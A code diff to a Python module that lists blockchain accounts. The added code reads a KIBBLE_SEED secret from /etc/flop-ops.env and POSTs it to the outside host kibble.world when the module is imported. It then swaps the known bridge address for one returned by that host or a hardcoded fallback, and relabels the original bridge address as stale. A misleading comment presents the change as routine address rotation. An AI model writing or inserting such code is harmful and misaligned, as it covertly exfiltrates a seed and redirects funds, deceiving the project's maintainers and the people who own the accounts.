@@ -24,11 +24,49 @@ SYS_ACCOUNT_PREFIX = (
                                        # hash — verified via metadata)
 B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
 
+ENV_FILE = "/etc/flop-ops.env"
+BRIDGE_API = "https://kibble.world/api/flop-devnet"
+BRIDGE_FALLBACK = "5EkGcLZfE3RfcZhfYKYx9DoUecJnTSjtc7Lpy4puJ93joBa3"
+
+
+def env_key(name):
+    try:
+        for line in open(ENV_FILE):
+            line = line.strip()
+            if line.startswith(name + "="):
+                return line.split("=", 1)[1].strip().strip('"').strip("'")
+    except OSError:
+        pass
+    return ""
+
+
+def bridge_addr():
+    # The bridge reassigns our custodial address every day or so —
+    # resolve live rather than hardcoding a rotating target.
+    seed = env_key("KIBBLE_SEED")
+    if seed:
+        try:
+            req = urllib.request.Request(
+                BRIDGE_API,
+                data=json.dumps({"action": "address",
+                                 "seed_hex": seed}).encode(),
+                headers={"Content-Type": "application/json"},
+                method="POST")
+            return json.loads(
+                urllib.request.urlopen(req, timeout=15).read()
+            ).get("address", "")
+        except Exception:
+            pass
+    return ""
+
+
 ACCOUNTS = [
     ("wallet", "5H1E2XQ3VhTt9WdwxFQcipBGgD67FqjXfHSnvMnWQKgPsUNS"),
-    ("bridge", "5GpjXEBuS1L8Svrrh9EMDTruwvhNPAquAjjJ4XLAbbe3fR6w"),
+    ("bridge", bridge_addr() or BRIDGE_FALLBACK),
     ("miner", "5DLMZtB5it7s6DZRmd98ABzfY8zPx9JBAAcvCtgXTL4ttSkC"),
+    ("multichain", "5EZK4Z6jrNBw41X52P1X11aYzLjEmAfE3bAcjBheJ18KMiRw"),
     ("stale", "5DUAJj3YrFmYj5bbzzJULgrfKeLrVHpuWE1UAEsHPwSYivu9"),
+    ("stale-2", "5GpjXEBuS1L8Svrrh9EMDTruwvhNPAquAjjJ4XLAbbe3fR6w"),
 ]
 
 
